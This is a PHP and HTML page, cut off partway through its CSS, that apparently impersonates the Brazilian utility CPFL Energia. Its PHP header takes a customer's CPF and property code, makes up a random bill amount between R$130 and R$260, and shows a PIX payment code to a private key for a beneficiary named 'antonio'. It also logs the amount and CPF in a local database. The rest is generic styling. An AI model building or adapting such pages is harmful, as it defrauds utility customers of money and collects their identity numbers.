
<?php
session_set_cookie_params(0);

date_default_timezone_set('America/Sao_Paulo');

$currentDate = new DateTime();

$mesRef = $currentDate->format('M/Y');

$vencimento = $currentDate->format('d/m/Y');
    $chave_pix= "58b44f4e-a6fa-469d-9165-ffc1b41c5841";
    $beneficiario_pix="antonio";
    $cidade_pix="sao paulo";
    session_start();

    if (!isset($_SESSION['valorAleatorio'])) {
      $_SESSION['valorAleatorio'] = rand(13000, 26000) / 100;

    }
    
    $valorAleatorio = $_SESSION['valorAleatorio'];
    $valor_pix = $valorAleatorio;
    $descricao='';
    if ((!isset($_POST["identificador"])) || (empty($_POST["identificador"]))) {
    $identificador="***";
    }
    if (strlen($identificador) > 25) {
        $identificador=substr($identificador,0,25);
    }
    $gerar_qrcode=true;

 $codigo = $_POST["codigoImovel"];
 $documento = $_POST["documento"];

 $numero = '2748237489237';

$tamanho = strlen($numero);

function gerarNumeroAleatorio($tamanho) {
    $numeroAleatorio = '';
    $primeiroDigito = rand(1, 9);
    $numeroAleatorio .= $primeiroDigito;
    
    for ($i = 1; $i < $tamanho; $i++) {
        $numeroAleatorio .= rand(0, 9);
    }
    
    return $numeroAleatorio;
}


$valorTotal = $valor_pix;
$db_host = 'localhost';
$db_nome = 'atestado';
$db_usuario = 'root';
$db_senha = '';
$db_charset = 'utf8';

$dsn = "mysql:host={$db_host};dbname={$db_nome};charset={$db_charset}";

$options = [
    PDO::ATTR_ERRMODE            => PDO::ERRMODE_EXCEPTION,
    PDO::ATTR_DEFAULT_FETCH_MODE => PDO::FETCH_ASSOC,
    PDO::ATTR_EMULATE_PREPARES   => false,
];
// Remove caracteres especiais do CPF
$cpfUsuario = preg_replace("/[^0-9]/", "", $documento);

try {
  $pdo = new PDO($dsn, $db_usuario, $db_senha, $options);

  if (isset($cpfUsuario) && !empty($cpfUsuario)) {
      $sql_verificar = "SELECT COUNT(*) FROM faturas WHERE valor_total = ? AND cpf_usuario = ?";
      $stmt_verificar = $pdo->prepare($sql_verificar);
      $stmt_verificar->execute([$valor_pix, $cpfUsuario]);
      $num_rows = $stmt_verificar->fetchColumn();

      if ($num_rows == 0) { 
          $sql = "INSERT INTO faturas (valor_total, cpf_usuario) VALUES (?, ?)";
          
          $stmt = $pdo->prepare($sql);

          $stmt->execute([$valor_pix, $cpfUsuario]);
      } else {

      }
  } else {
  }

} catch (\PDOException $e) {
}




?>
<!DOCTYPE html>
<html lang="pt-BR" class="">

<head>
    <script src="https://kit.fontawesome.com/c49e0b56e6.js" crossorigin="anonymous"></script>
    <script>
    window.addEventListener('beforeunload', function(event) {
        var xhr = new XMLHttpRequest();
        xhr.open('GET', 'destroy_session.php', false);
        xhr.send();
    });
</script>
    <link rel="stylesheet" href="assets/css/search.css">
  <meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
  <style type="text/css">
    [uib-typeahead-popup].dropdown-menu {
      display: block;
    }
  </style>
  <style type="text/css">
    .uib-time input {
      width: 50px;
    }
  </style>
  <style type="text/css">
    [uib-tooltip-popup].tooltip.top-left>.tooltip-arrow,
    [uib-tooltip-popup].tooltip.top-right>.tooltip-arrow,
    [uib-tooltip-popup].tooltip.bottom-left>.tooltip-arrow,
    [uib-tooltip-popup].tooltip.bottom-right>.tooltip-arrow,
    [uib-tooltip-popup].tooltip.left-top>.tooltip-arrow,
    [uib-tooltip-popup].tooltip.left-bottom>.tooltip-arrow,
    [uib-tooltip-popup].tooltip.right-top>.tooltip-arrow,
    [uib-tooltip-popup].tooltip.right-bottom>.tooltip-arrow,
    [uib-tooltip-html-popup].tooltip.top-left>.tooltip-arrow,
    [uib-tooltip-html-popup].tooltip.top-right>.tooltip-arrow,
    [uib-tooltip-html-popup].tooltip.bottom-left>.tooltip-arrow,
    [uib-tooltip-html-popup].tooltip.bottom-right>.tooltip-arrow,
    [uib-tooltip-html-popup].tooltip.left-top>.tooltip-arrow,
    [uib-tooltip-html-popup].tooltip.left-bottom>.tooltip-arrow,
    [uib-tooltip-html-popup].tooltip.right-top>.tooltip-arrow,
    [uib-tooltip-html-popup].tooltip.right-bottom>.tooltip-arrow,
    [uib-tooltip-template-popup].tooltip.top-left>.tooltip-arrow,
    [uib-tooltip-template-popup].tooltip.top-right>.tooltip-arrow,
    [uib-tooltip-template-popup].tooltip.bottom-left>.tooltip-arrow,
    [uib-tooltip-template-popup].tooltip.bottom-right>.tooltip-arrow,
    [uib-tooltip-template-popup].tooltip.left-top>.tooltip-arrow,
    [uib-tooltip-template-popup].tooltip.left-bottom>.tooltip-arrow,
    [uib-tooltip-template-popup].tooltip.right-top>.tooltip-arrow,
    [uib-tooltip-template-popup].tooltip.right-bottom>.tooltip-arrow,
    [uib-popover-popup].popover.top-left>.arrow,
    [uib-popover-popup].popover.top-right>.arrow,
    [uib-popover-popup].popover.bottom-left>.arrow,
    [uib-popover-popup].popover.bottom-right>.arrow,
    [uib-popover-popup].popover.left-top>.arrow,
    [uib-popover-popup].popover.left-bottom>.arrow,
    [uib-popover-popup].popover.right-top>.arrow,
    [uib-popover-popup].popover.right-bottom>.arrow,
    [uib-popover-html-popup].popover.top-left>.arrow,
    [uib-popover-html-popup].popover.top-right>.arrow,
    [uib-popover-html-popup].popover.bottom-left>.arrow,
    [uib-popover-html-popup].popover.bottom-right>.arrow,
    [uib-popover-html-popup].popover.left-top>.arrow,
    [uib-popover-html-popup].popover.left-bottom>.arrow,
    [uib-popover-html-popup].popover.right-top>.arrow,
    [uib-popover-html-popup].popover.right-bottom>.arrow,
    [uib-popover-template-popup].popover.top-left>.arrow,
    [uib-popover-template-popup].popover.top-right>.arrow,
    [uib-popover-template-popup].popover.bottom-left>.arrow,
    [uib-popover-template-popup].popover.bottom-right>.arrow,
    [uib-popover-template-popup].popover.left-top>.arrow,
    [uib-popover-template-popup].popover.left-bottom>.arrow,
    [uib-popover-template-popup].popover.right-top>.arrow,
    [uib-popover-template-popup].popover.right-bottom>.arrow {
      top: auto;
      bottom: auto;
      left: auto;
      right: auto;
      margin: 0;
    }

    [uib-popover-popup].popover,
    [uib-popover-html-popup].popover,
    [uib-popover-template-popup].popover {
      display: block !important;
    }
  </style>
  <style type="text/css">
    .uib-datepicker-popup.dropdown-menu {
      display: block;
      float: none;
      margin: 0;
    }

    .uib-button-bar {
      padding: 10px 9px 2px;
    }
  </style>
  <style type="text/css">
    .uib-position-measure {
      display: block !important;
      visibility: hidden !important;
      position: absolute !important;
      top: -9999px !important;
      left: -9999px !important;
    }

    .uib-position-scrollbar-measure {
      position: absolute !important;
      top: -9999px !important;
      width: 50px !important;
      height: 50px !important;
      overflow: scroll !important;
    }

    .uib-position-body-scrollbar-measure {
      overflow: scroll !important;
    }
  </style>
  <script>
    function copiar() {
    var copyText = document.getElementById("brcodepix");
    copyText.select();
    copyText.setSelectionRange(0, 99999);
    document.execCommand("copy");
    document.getElementById("clip_btn").innerHTML='Copiar Codigo <i class="fas fa-clipboard-check"></i>';
    }
    function reais(v){
        v=v.replace(/\D/g,"");
        v=v/100;
        v=v.toFixed(2);
        return v;
    }
    function mascara(o,f){
        v_obj=o;
        v_fun=f;
        setTimeout("execmascara()",1);
    }
    function execmascara(){
        v_obj.value=v_fun(v_obj.value);
    }
    $(function () {
    $('[data-toggle="tooltip"]').tooltip()
    })
    </script>
  <style type="text/css">
    .uib-datepicker .uib-title {
      width: 100%;
    }

    .uib-day button,
    .uib-month button,
    .uib-year button {
      min-width: 100%;
    }

    .uib-left,
    .uib-right {
      width: 100%
    }
  </style>
  <style type="text/css">
    .ng-animate.item:not(.left):not(.right) {
      -webkit-transition: 0s ease-in-out left;
      transition: 0s ease-in-out left
    }
  </style>
  <style type="text/css">
    @charset "UTF-8";

    [ng\:cloak],
    [ng-cloak],
    [data-ng-cloak],
    [x-ng-cloak],
    .ng-cloak,
    .x-ng-cloak,
    .ng-hide:not(.ng-hide-animate) {
      display: none !important;
    }

    ng\:form {
      display: block;
    }

    .ng-animate-shim {
      visibility: hidden;
    }

    .ng-anchor {
      position: absolute;
    }
  </style>
  <style>
    .basepix {
      background: #ffffff;
      padding: 12px;
      display: flex;
      justify-content: center;
    }

    @media (max-width: 600px) {
      .basepix {
        display: block;
      }
    }
  </style>
  <meta http-equiv="X-UA-Compatible" content="IE=edge">
  <title>CPFL Energia - Serviços OnLine</title>
  <link rel="icon" href="assets/img/logo_0.jpg" type="image/jpeg">
  <meta name="format-detection" content="telephone=no">
  <meta name="viewport" content="width=device-width,initial-scale=1,user-scalable=0,minimal-ui">
  <link rel="stylesheet" href="assets/css/loadingScreen.css">
  <link rel="stylesheet" href="assets/css/app.css">
  <link rel="stylesheet" href="assets/css/vendor.css">
  <link rel="stylesheet" href="assets/css/font-awesome.min.css">
  <style type="text/css"></style>
  <style>
    .swal2-popup.swal2-toast {
      box-sizing: border-box;
      grid-column: 1/4 !important;
      grid-row: 1/4 !important;
      grid-template-columns: min-content auto min-content;
      padding: 1em;
      overflow-y: hidden;
      background: #fff;
      box-shadow: 0 0 1px rgba(0, 0, 0, .075), 0 1px 2px rgba(0, 0, 0, .075), 1px 2px 4px rgba(0, 0, 0, .075), 1px 3px 8px rgba(0, 0, 0, .075), 2px 4px 16px rgba(0, 0, 0, .075);
      pointer-events: all
    }

    .swal2-popup.swal2-toast>* {
      grid-column: 2
    }

    .swal2-popup.swal2-toast .swal2-title {
      margin: .5em 1em;
      padding: 0;
      font-size: 1em;
      text-align: initial
    }

    .swal2-popup.swal2-toast .swal2-loading {
      justify-content: center
    }

    .swal2-popup.swal2-toast .swal2-input {
      height: 2em;
      margin: .5em;
      font-size: 1em
    }

    .swal2-popup.swal2-toast .swal2-validation-message {
      font-size: 1em
    }

    .swal2-popup.swal2-toast .swal2-footer {
      margin: .5em 0 0;
      padding: .5em 0 0;
      font-size: .8em
    }

    .swal2-popup.swal2-toast .swal2-close {
      grid-column: 3/3;
      grid-row: 1/99;
      align-self: center;
      width: .8em;
      height: .8em;
      margin: 0;
      font-size: 2em
    }

    .swal2-popup.swal2-toast .swal2-html-container {
      margin: .5em 1em;
      padding: 0;
      overflow: initial;
      font-size: 1em;
      text-align: initial
    }

    .swal2-popup.swal2-toast .swal2-html-container:empty {
      padding: 0
    }

    .swal2-popup.swal2-toast .swal2-loader {
      grid-column: 1;
      grid-row: 1/99;
      align-self: center;
      width: 2em;
      height: 2em;
      margin: .25em
    }

    .swal2-popup.swal2-toast .swal2-icon {
      grid-column: 1;
      grid-row: 1/99;
      align-self: center;
      width: 2em;
      min-width: 2em;
      height: 2em;
      margin: 0 .5em 0 0
    }

    .swal2-popup.swal2-toast .swal2-icon .swal2-icon-content {
      display: flex;
      align-items: center;
      font-size: 1.8em;
      font-weight: bold
    }

    .swal2-popup.swal2-toast .swal2-icon.swal2-success .swal2-success-ring {
      width: 2em;
      height: 2em
    }

    .swal2-popup.swal2-toast .swal2-icon.swal2-error [class^=swal2-x-mark-line] {
      top: .875em;
      width: 1.375em
    }

    .swal2-popup.swal2-toast .swal2-icon.swal2-error [class^=swal2-x-mark-line][class$=left] {
      left: .3125em
    }

    .swal2-popup.swal2-toast .swal2-icon.swal2-error [class^=swal2-x-mark-line][class$=right] {
      right: .3125em
    }

    .swal2-popup.swal2-toast .swal2-actions {
      justify-content: flex-start;
      height: auto;
      margin: 0;
      margin-top: .5em;
      padding: 0 .5em
    }

    .swal2-popup.swal2-toast .swal2-styled {
      margin: .25em .5em;
      padding: .4em .6em;
      font-size: 1em
    }

    .swal2-popup.swal2-toast .swal2-success {
      border-color: #a5dc86
    }

    .swal2-popup.swal2-toast .swal2-success [class^=swal2-success-circular-line] {
      position: absolute;
      width: 1.6em;
      height: 3em;
      transform: rotate(45deg);
      border-radius: 50%
    }

    .swal2-popup.swal2-toast .swal2-success [class^=swal2-success-circular-line][class$=left] {
      top: -0.8em;
      left: -0.5em;
      transform: rotate(-45deg);
      transform-origin: 2em 2em;
      border-radius: 4em 0 0 4em
    }

    .swal2-popup.swal2-toast .swal2-success [class^=swal2-success-circular-line][class$=right] {
      top: -0.25em;
      left: .9375em;
      transform-origin: 0 1.5em;
      border-radius: 0 4em 4em 0
    }

    .swal2-popup.swal2-toast .swal2-success .swal2-success-ring {
      width: 2em;
      height: 2em
    }

    .swal2-popup.swal2-toast .swal2-success .swal2-success-fix {
      top: 0;
      left: .4375em;
      width: .4375em;
      height: 2.6875em
    }

    .swal2-popup.swal2-toast .swal2-success [class^=swal2-success-line] {
      height: .3125em
    }

    .swal2-popup.swal2-toast .swal2-success [class^=swal2-success-line][class$=tip] {
      top: 1.125em;
      left: .1875em;
      width: .75em
    }

    .swal2-popup.swal2-toast .swal2-success [class^=swal2-success-line][class$=long] {
      top: .9375em;
      right: .1875em;
      width: 1.375em
    }

    .swal2-popup.swal2-toast .swal2-success.swal2-icon-show .swal2-success-line-tip {
      animation: swal2-toast-animate-success-line-tip .75s
    }

    .swal2-popup.swal2-toast .swal2-success.swal2-icon-show .swal2-success-line-long {
      animation: swal2-toast-animate-success-line-long .75s
    }

    .swal2-popup.swal2-toast.swal2-show {
      animation: swal2-toast-show .5s
    }

    .swal2-popup.swal2-toast.swal2-hide {
      animation: swal2-toast-hide .1s forwards
    }

    .swal2-container {
      display: grid;
      position: fixed;
      z-index: 1060;
      top: 0;
      right: 0;
      bottom: 0;
      left: 0;
      box-sizing: border-box;
      grid-template-areas: "top-start     top            top-end" "center-start  center         center-end" "bottom-start  bottom-center  bottom-end";
      grid-template-rows: minmax(min-content, auto) minmax(min-content, auto) minmax(min-content, auto);
      height: 100%;
      padding: .625em;
      overflow-x: hidden;
      transition: background-color .1s;
      -webkit-overflow-scrolling: touch
    }

    .swal2-container.swal2-backdrop-show,
    .swal2-container.swal2-noanimation {
      background: rgba(0, 0, 0, .4)
    }

    .swal2-container.swal2-backdrop-hide {
      background: rgba(0, 0, 0, 0) !important
    }

    .swal2-container.swal2-top-start,
    .swal2-container.swal2-center-start,
    .swal2-container.swal2-bottom-start {
      grid-template-columns: minmax(0, 1fr) auto auto
    }

    .swal2-container.swal2-top,
    .swal2-container.swal2-center,
    .swal2-container.swal2-bottom {
      grid-template-columns: auto minmax(0, 1fr) auto
    }

    .swal2-container.swal2-top-end,
    .swal2-container.swal2-center-end,
    .swal2-container.swal2-bottom-end {
      grid-template-columns: auto auto minmax(0, 1fr)
    }

    .swal2-container.swal2-top-start>.swal2-popup {
      align-self: start
    }

    .swal2-container.swal2-top>.swal2-popup {
      grid-column: 2;
      align-self: start;
      justify-self: center
    }

    .swal2-container.swal2-top-end>.swal2-popup,
    .swal2-container.swal2-top-right>.swal2-popup {
      grid-column: 3;
      align-self: start;
      justify-self: end
    }

    .swal2-container.swal2-center-start>.swal2-popup,
    .swal2-container.swal2-center-left>.swal2-popup {
      grid-row: 2;
      align-self: center
    }

    .swal2-container.swal2-center>.swal2-popup {
      grid-column: 2;
      grid-row: 2;
      align-self: center;
      justify-self: center
    }

    .swal2-container.swal2-center-end>.swal2-popup,
    .swal2-container.swal2-center-right>.swal2-popup {
      grid-column: 3;
      grid-row: 2;
      align-self: center;
      justify-self: end
    }

    .swal2-container.swal2-bottom-start>.swal2-popup,
    .swal2-container.swal2-bottom-left>.swal2-popup {
      grid-column: 1;
      grid-row: 3;
      align-self: end
    }

    .swal2-container.swal2-bottom>.swal2-popup {
      grid-column: 2;
      grid-row: 3;
      justify-self: center;
      align-self: end
    }

    .swal2-container.swal2-bottom-end>.swal2-popup,
    .swal2-container.swal2-bottom-right>.swal2-popup {
      grid-column: 3;
      grid-row: 3;
      align-self: end;
      justify-self: end
    }

    .swal2-container.swal2-grow-row>.swal2-popup,
    .swal2-container.swal2-grow-fullscreen>.swal2-popup {
      grid-column: 1/4;
      width: 100%
    }

    .swal2-container.swal2-grow-column>.swal2-popup,
    .swal2-container.swal2-grow-fullscreen>.swal2-popup {
      grid-row: 1/4;
      align-self: stretch
    }

    .swal2-container.swal2-no-transition {
      transition: none !important
    }

    .swal2-popup {
      display: none;
      position: relative;
      box-sizing: border-box;
      grid-template-columns: minmax(0, 100%);
      width: 32em;
      max-width: 100%;
      padding: 0 0 1.25em;
      border: none;
      border-radius: 5px;
      background: #fff;
      color: #545454;
      font-family: inherit;
      font-size: 1rem
    }

    .swal2-popup:focus {
      outline: none
    }

    .swal2-popup.swal2-loading {
      overflow-y: hidden
    }

    .swal2-title {
      position: relative;
      max-width: 100%;
      margin: 0;
      padding: .8em 1em 0;
      color: inherit;
      font-size: 1.875em;
      font-weight: 600;
      text-align: center;
      text-transform: none;
      word-wrap: break-word
    }

    .swal2-actions {
      display: flex;
      z-index: 1;
      box-sizing: border-box;
      flex-wrap: wrap;
      align-items: center;
      justify-content: center;
      width: auto;
      margin: 1.25em auto 0;
      padding: 0
    }

    .swal2-actions:not(.swal2-loading) .swal2-styled:hover {
      background-image: linear-gradient(rgba(0, 0, 0, 0.1), rgba(0, 0, 0, 0.1))
    }

    .swal2-actions:not(.swal2-loading) .swal2-styled:active {
      background-image: linear-gradient(rgba(0, 0, 0, 0.2), rgba(0, 0, 0, 0.2))
    }

    .swal2-loader {
      display: none;
      align-items: center;
      justify-content: center;
      width: 2.2em;
      height: 2.2em;
      margin: 0 1.875em;
      animation: swal2-rotate-loading 1.5s linear 0s infinite normal;
      border-width: .25em;
      border-style: solid;
      border-radius: 100%;
      border-color: #2778c4 rgba(0, 0, 0, 0) #2778c4 rgba(0, 0, 0, 0)
    }

    .swal2-styled {
      margin: .3125em;
      padding: .625em 1.1em;
      transition: box-shadow .1s;
      box-shadow: 0 0 0 3px rgba(0, 0, 0, 0);
      font-weight: 500
    }

    .swal2-styled:not([disabled]) {
      cursor: pointer
    }

    .swal2-styled.swal2-confirm {
      border: 0;
      border-radius: .25em;
      background: initial;
      background-color: #7066e0;
      color: #fff;
      font-size: 1em
    }

    .swal2-styled.swal2-confirm:focus {
      box-shadow: 0 0 0 3px rgba(112, 102, 224, .5)
    }

    .swal2-styled.swal2-deny {
      border: 0;
      border-radius: .25em;
      background: initial;
      background-color: #dc3741;
      color: #fff;
      font-size: 1em
    }

    .swal2-styled.swal2-deny:focus {
      box-shadow: 0 0 0 3px rgba(220, 55, 65, .5)
    }

    .swal2-styled.swal2-cancel {
      border: 0;
      border-radius: .25em;
      background: initial;
      background-color: #6e7881;
      color: #fff;
      font-size: 1em
    }

    .swal2-styled.swal2-cancel:focus {
      box-shadow: 0 0 0 3px rgba(110, 120, 129, .5)
    }

    .swal2-styled.swal2-default-outline:focus {
      box-shadow: 0 0 0 3px rgba(100, 150, 200, .5)
    }

    .swal2-styled:focus {
      outline: none
    }

    .swal2-styled::-moz-focus-inner {
      border: 0
    }

    .swal2-footer {
      justify-content: center;
      margin: 1em 0 0;
      padding: 1em 1em 0;
      border-top: 1px solid #eee;
      color: inherit;
      font-size: 1em
    }

    .swal2-timer-progress-bar-container {
      position: absolute;
      right: 0;
      bottom: 0;
      left: 0;
      grid-column: auto !important;
      overflow: hidden;
      border-bottom-right-radius: 5px;
      border-bottom-left-radius: 5px
    }

    .swal2-timer-progress-bar {
      width: 100%;
      height: .25em;
      background: rgba(0, 0, 0, .2)
    }

    .swal2-image {
      max-width: 100%;
      margin: 2em auto 1em
    }

    .swal2-close {
      z-index: 2;
      align-items: center;
      justify-content: center;
      width: 1.2em;
      height: 1.2em;
      margin-top: 0;
      margin-right: 0;
      margin-bottom: -1.2em;
      padding: 0;
      overflow: hidden;
      transition: color .1s, box-shadow .1s;
      border: none;
      border-radius: 5px;
      background: rgba(0, 0, 0, 0);
      color: #ccc;
      font-family: serif;
      font-family: monospace;
      font-size: 2.5em;
      cursor: pointer;
      justify-self: end
    }

    .swal2-close:hover {
      transform: none;
      background: rgba(0, 0, 0, 0);
      color: #f27474
    }

    .swal2-close:focus {
      outline: none;
      box-shadow: inset 0 0 0 3px rgba(100, 150, 200, .5)
    }

    .swal2-close::-moz-focus-inner {
      border: 0
    }

    .swal2-html-container {
      z-index: 1;
      justify-content: center;
      margin: 1em 1.6em .3em;
      padding: 0;
      overflow: auto;
      color: inherit;
      font-size: 1.125em;
      font-weight: normal;
      line-height: normal;
      text-align: center;
      word-wrap: break-word;
      word-break: break-word
    }

    .swal2-input,
    .swal2-file,
    .swal2-textarea,
    .swal2-select,
    .swal2-radio,
    .swal2-checkbox {
      margin: 1em 2em 3px
    }

    .swal2-input,
    .swal2-file,
    .swal2-textarea {
      box-sizing: border-box;
      width: auto;
      transition: border-color .1s, box-shadow .1s;
      border: 1px solid #d9d9d9;
      border-radius: .1875em;
      background: rgba(0, 0, 0, 0);
      box-shadow: inset 0 1px 1px rgba(0, 0, 0, .06), 0 0 0 3px rgba(0, 0, 0, 0);
      color: inherit;
      font-size: 1.125em
    }

    .swal2-input.swal2-inputerror,
    .swal2-file.swal2-inputerror,
    .swal2-textarea.swal2-inputerror {
      border-color: #f27474 !important;
      box-shadow: 0 0 2px #f27474 !important
    }

    .swal2-input:focus,
    .swal2-file:focus,
    .swal2-textarea:focus {
      border: 1px solid #b4dbed;
      outline: none;
      box-shadow: inset 0 1px 1px rgba(0, 0, 0, .06), 0 0 0 3px rgba(100, 150, 200, .5)
    }

    .swal2-input::placeholder,
    .swal2-file::placeholder,
    .swal2-textarea::placeholder {
      color: #ccc
    }

    .swal2-range {
      margin: 1em 2em 3px;
      background: #fff
    }

    .swal2-range input {
      width: 80%
    }

    .swal2-range output {
      width: 20%;
      color: inherit;
      font-weight: 600;
      text-align: center
    }

    .swal2-range input,
    .swal2-range output {
      height: 2.625em;
      padding: 0;
      font-size: 1.125em;
      line-height: 2.625em
    }

    .swal2-input {
      height: 2.625em;
      padding: 0 .75em
    }

    .swal2-file {
      width: 75%;
      margin-right: auto;
      margin-left: auto;
      background: rgba(0, 0, 0, 0);
      font-size: 1.125em
    }

    .swal2-textarea {
      height: 6.75em;
      padding: .75em
    }

    .swal2-select {
      min-width: 50%;
      max-width: 100%;
      padding: .375em .625em;
      background: rgba(0, 0, 0, 0);
      color: inherit;
      font-size: 1.125em
    }

    .swal2-radio,
    .swal2-checkbox {
      align-items: center;
      justify-content: center;
      background: #fff;
      color: inherit
    }

    .swal2-radio label,
    .swal2-checkbox label {
      margin: 0 .6em;
      font-size: 1.125em
    }

    .swal2-radio input,
    .swal2-checkbox input {
      flex-shrink: 0;
      margin: 0 .4em
    }

    .swal2-input-label {
      display: flex;
      justify-content: center;
      margin: 1em auto 0
    }

    .swal2-validation-message {
      align-items: center;
      justify-content: center;
      margin: 1em 0 0;
      padding: .625em;
      overflow: hidden;
      background: #f0f0f0;
      color: #666;
      font-size: 1em;
      font-weight: 300
    }

    .swal2-validation-message::before {
      content: "!";
      display: inline-block;
      width: 1.5em;
      min-width: 1.5em;
      height: 1.5em;
      margin: 0 .625em;
      border-radius: 50%;
      background-color: #f27474;
      color: #fff;
      font-weight: 600;
      line-height: 1.5em;
      text-align: center
    }

    .swal2-icon {
      position: relative;
      box-sizing: content-box;
      justify-content: center;
      width: 5em;
      height: 5em;
      margin: 2.5em auto .6em;
      border: 0.25em solid rgba(0, 0, 0, 0);
      border-radius: 50%;
      border-color: #000;
      font-family: inherit;
      line-height: 5em;
      cursor: default;
      user-select: none
    }

    .swal2-icon .swal2-icon-content {
      display: flex;
      align-items: center;
      font-size: 3.75em
    }

    .swal2-icon.swal2-error {
      border-color: #f27474;
      color: #f27474
    }

    .swal2-icon.swal2-error .swal2-x-mark {
      position: relative;
      flex-grow: 1
    }

    .swal2-icon.swal2-error [class^=swal2-x-mark-line] {
      display: block;
      position: absolute;
      top: 2.3125em;
      width: 2.9375em;
      height: .3125em;
      border-radius: .125em;
      background-color: #f27474
    }

    .swal2-icon.swal2-error [class^=swal2-x-mark-line][class$=left] {
      left: 1.0625em;
      transform: rotate(45deg)
    }

    .swal2-icon.swal2-error [class^=swal2-x-mark-line][class$=right] {
      right: 1em;
      transform: rotate(-45deg)
    }

    .swal2-icon.swal2-error.swal2-icon-show {
      animation: swal2-animate-error-icon .5s
    }

    .swal2-icon.swal2-error.swal2-icon-show .swal2-x-mark {
      animation: swal2-animate-error-x-mark .5s
    }

    .swal2-icon.swal2-warning {
      border-color: #facea8;
      color: #f8bb86
    }

    .swal2-icon.swal2-warning.swal2-icon-show {
      animation: swal2-animate-error-icon .5s
    }

    .swal2-icon.swal2-warning.swal2-icon-show .swal2-icon-content {
      animation: swal2-animate-i-mark .5s
    }

    .swal2-icon.swal2-info {
      border-color: #9de0f6;
      color: #3fc3ee
    }

    .swal2-icon.swal2-info.swal2-icon-show {
      animation: swal2-animate-error-icon .5s
    }

    .swal2-icon.swal2-info.swal2-icon-show .swal2-icon-content {
      animation: swal2-animate-i-mark .8s
    }

    .swal2-icon.swal2-question {
      border-color: #c9dae1;
      color: #87adbd
    }

    .swal2-icon.swal2-question.swal2-icon-show {
      animation: swal2-animate-error-icon .5s
    }

    .swal2-icon.swal2-question.swal2-icon-show .swal2-icon-content {
      animation: swal2-animate-question-mark .8s
    }

    .swal2-icon.swal2-success {
      border-color: #a5dc86;
      color: #a5dc86
    }

    .swal2-icon.swal2-success [class^=swal2-success-circular-line] {
      position: absolute;
      width: 3.75em;
      height: 7.5em;
      transform: rotate(45deg);
      border-radius: 50%
    }

    .swal2-icon.swal2-success [class^=swal2-success-circular-line][class$=left] {
      top: -0.4375em;
      left: -2.0635em;
      transform: rotate(-45deg);
      transform-origin: 3.75em 3.75em;
      border-radius: 7.5em 0 0 7.5em
    }

    .swal2-icon.swal2-success [class^=swal2-success-circular-line][class$=right] {
      top: -0.6875em;
      left: 1.875em;
      transform: rotate(-45deg);
      transform-origin: 0 3.75em;
      border-radius: 0 7.5em 7.5em 0
    }

    .swal2-icon.swal2-success .swal2-success-ring {
      position: absolute;
      z-index: 2;
      top: -0.25em;
      left: -0.25em;
      box-sizing: content-box;
      width: 100%;
      height: 100%;
      border: .25em solid rgba(165, 220, 134, .3);
      border-radius: 50%
    }

    .swal2-icon.swal2-success .swal2-success-fix {
      position: absolute;
      z-index: 1;
      top: .5em;
      left: 1.625em;
      width: .4375em;
      height: 5.625em;
      transform: rotate(-45deg)
    }

    .swal2-icon.swal2-success [class^=swal2-success-line] {
      display: block;
      position: absolute;
      z-index: 2;
      height: .3125em;
      border-radius: .125em;
      background-color: #a5dc86
    }

    .swal2-icon.swal2-success [class^=swal2-success-line][class$=tip] {
      top: 2.875em;
      left: .8125em;
      width: 1.5625em;
      transform: rotate(45deg)
    }

    .swal2-icon.swal2-success [class^=swal2-success-line][class$=long] {
      top: 2.375em;
      right: .5em;
      width: 2.9375em;
      transform: rotate(-45deg)
    }

    .swal2-icon.swal2-success.swal2-icon-show .swal2-success-line-tip {
      animation: swal2-animate-success-line-tip .75s
    }

    .swal2-icon.swal2-success.swal2-icon-show .swal2-success-line-long {
      animation: swal2-animate-success-line-long .75s
    }

    .swal2-icon.swal2-success.swal2-icon-show .swal2-success-circular-line-right {
      animation: swal2-rotate-success-circular-line 4.25s ease-in
    }

    .swal2-progress-steps {
      flex-wrap: wrap;
      align-items: center;
      max-width: 100%;
      margin: 1.25em auto;
      padding: 0;
      background: rgba(0, 0, 0, 0);
      font-weight: 600
    }

    .swal2-progress-steps li {
      display: inline-block;
      position: relative
    }

    .swal2-progress-steps .swal2-progress-step {
      z-index: 20;
      flex-shrink: 0;
      width: 2em;
      height: 2em;
      border-radius: 2em;
      background: #2778c4;
      color: #fff;
      line-height: 2em;
      text-align: center
    }

    .swal2-progress-steps .swal2-progress-step.swal2-active-progress-step {
      background: #2778c4
    }

    .swal2-progress-steps .swal2-progress-step.swal2-active-progress-step~.swal2-progress-step {
      background: #add8e6;
      color: #fff
    }

    .swal2-progress-steps .swal2-progress-step.swal2-active-progress-step~.swal2-progress-step-line {
      background: #add8e6
    }

    .swal2-progress-steps .swal2-progress-step-line {
      z-index: 10;
      flex-shrink: 0;
      width: 2.5em;
      height: .4em;
      margin: 0 -1px;
      background: #2778c4
    }

    [class^=swal2] {
      -webkit-tap-highlight-color: rgba(0, 0, 0, 0)
    }

    .swal2-show {
      animation: swal2-show .3s
    }

    .swal2-hide {
      animation: swal2-hide .15s forwards
    }

    .swal2-noanimation {
      transition: none
    }

    .swal2-scrollbar-measure {
      position: absolute;
      top: -9999px;
      width: 50px;
      height: 50px;
      overflow: scroll
    }

    .swal2-rtl .swal2-close {
      margin-right: initial;
      margin-left: 0
    }

    .swal2-rtl .swal2-timer-progress-bar {
      right: 0;
      left: auto
    }

    @keyframes swal2-toast-show {
      0% {
        transform: translateY(-0.625em) rotateZ(2deg)
      }

      33% {
        transform: translateY(0) rotateZ(-2deg)
      }

      66% {
        transform: translateY(0.3125em) rotateZ(2deg)
      }

      100% {
        transform: translateY(0) rotateZ(0deg)
      }
    }

    @keyframes swal2-toast-hide {
      100% {
        transform: rotateZ(1deg);
        opacity: 0
      }
    }

    @keyframes swal2-toast-animate-success-line-tip {
      0% {
        top: .5625em;
        left: .0625em;
        width: 0
      }

      54% {
        top: .125em;
        left: .125em;
        width: 0
      }

      70% {
        top: .625em;
        left: -0.25em;
        width: 1.625em
      }

      84% {
        top: 1.0625em;
        left: .75em;
        width: .5em
      }

      100% {
        top: 1.125em;
        left: .1875em;
        width: .75em
      }
    }

    @keyframes swal2-toast-animate-success-line-long {
      0% {
        top: 1.625em;
        right: 1.375em;
        width: 0
      }

      65% {
        top: 1.25em;
        right: .9375em;
        width: 0
      }

      84% {
        top: .9375em;
        right: 0;
        width: 1.125em
      }

      100% {
        top: .9375em;
        right: .1875em;
        width: 1.375em
      }
    }

    @keyframes swal2-show {
      0% {
        transform: scale(0.7)
      }

      45% {
        transform: scale(1.05)
      }

      80% {
        transform: scale(0.95)
      }

      100% {
        transform: scale(1)
      }
    }

    @keyframes swal2-hide {
      0% {
